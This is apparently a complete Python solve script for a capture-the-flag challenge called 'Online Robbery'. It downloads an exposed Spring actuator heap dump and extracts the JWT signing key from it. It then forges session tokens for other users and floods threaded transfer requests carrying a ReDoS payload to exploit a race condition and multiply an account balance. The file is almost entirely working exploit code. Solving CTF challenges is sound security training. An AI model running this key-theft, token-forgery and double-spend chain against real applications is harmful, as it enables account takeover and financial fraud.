import re
import io
import time
import json
import base64
import argparse
import threading
import requests
import jwt
from pyhprof.references import InstanceReference, PrimitiveArrayReference, ReferenceBuilder

# Removes the `typ` header to match the application behavior.
jwt.api_jws.PyJWS.header_typ = False

BOT_COUNT = 8

parser = argparse.ArgumentParser(description="Online Robbery - Solve script")
parser.add_argument("-t", "--target", type=str, default="http://localhost:5000", help="Target URL")

target_url: str = parser.parse_args().target

def extract_secret_key_spec(heapdump_bytes: bytes):
    flags = {"type_one": False, "type_two": False}
    with io.BytesIO(heapdump_bytes) as handle:
        builder = ReferenceBuilder(handle, flags)
        builder.build()

    for ref in builder.references.values():
        if not isinstance(ref, InstanceReference):
            continue
        if ref.cls is None:
            continue
        if ref.cls.name == "javax/crypto/spec/SecretKeySpec":
            secret_key_ref = ref
            break

    byte_arrays = []
    for field_name, child in secret_key_ref.children.items():
        if isinstance(child, PrimitiveArrayReference) and child.element_type == "BYTE":
            byte_arrays.append((field_name, child.raw_data()))

    return byte_arrays[0][1]

def get_jwt(user_id: int):
    return jwt.encode({"userId": user_id, "iat": int(time.time()), "exp": int(time.time() + 12*60*60)}, secret_bytes, algorithm="HS256")

def pay(jwt_token: str, target: str, amount: int, message):
    requests.post(target_url + "/transfer", cookies={"auth_token": jwt_token}, data={
        "recipientUsername": target,
        "amount": amount,
        "message": message
    })

for i in range(BOT_COUNT):
    requests.post(target_url + "/register", data={
        "username": f"bot_{i}",
        "password": "p455w0rd"
    })

login_res = requests.post(target_url + "/login", data={
    "username": "bot_0",
    "password": "p455w0rd"
}, allow_redirects=False)
bot_1_jwt = login_res.cookies.get("auth_token")
offset = json.loads(base64.b64decode(bot_1_jwt.split(".")[1] + "=="))["userId"]

heapdump_res = requests.get(target_url + "/actuator/heapdump", cookies={"auth_token": bot_1_jwt})
secret_bytes = extract_secret_key_spec(heapdump_res.content)

print(f"JWT key: {[value - 256 if value > 127 else value for value in secret_bytes]}")

alice_jwt = get_jwt(1)
bob_jwt = get_jwt(2)

print("Alice JWT: " + alice_jwt)
print("Bob JWT: " + bob_jwt)

pay(alice_jwt, "bob", 100, "foo")

redos_message = "a@" + ("a." * 23) # 48 characters

current_balance = 150

while current_balance < 1_000_000:
    
    threads: list[threading.Thread] = []
    
    for i in range(offset, BOT_COUNT + offset):
        t = threading.Thread(target=pay, args=(bob_jwt, f"bot_{i}", current_balance, redos_message))
        threads.append(t)
        t.start()
        time.sleep(0.1)
    
    for t in threads:
        t.join()
    
    for i in range(offset, BOT_COUNT + offset):
        bot_jwt = get_jwt(i)
        pay(bot_jwt, "bob", current_balance, "bar")
    
    dashboard_res = requests.get(target_url + "/dashboard", cookies={"auth_token": bob_jwt})
    current_balance = float(dashboard_res.text.split("<h2>")[1].split(" €</h2>")[0])
    print(f"Current balance: {current_balance}")


flag = re.findall(r"BZHCTF\{.*?\}", dashboard_res.text)[0]
print("Flag: " + flag)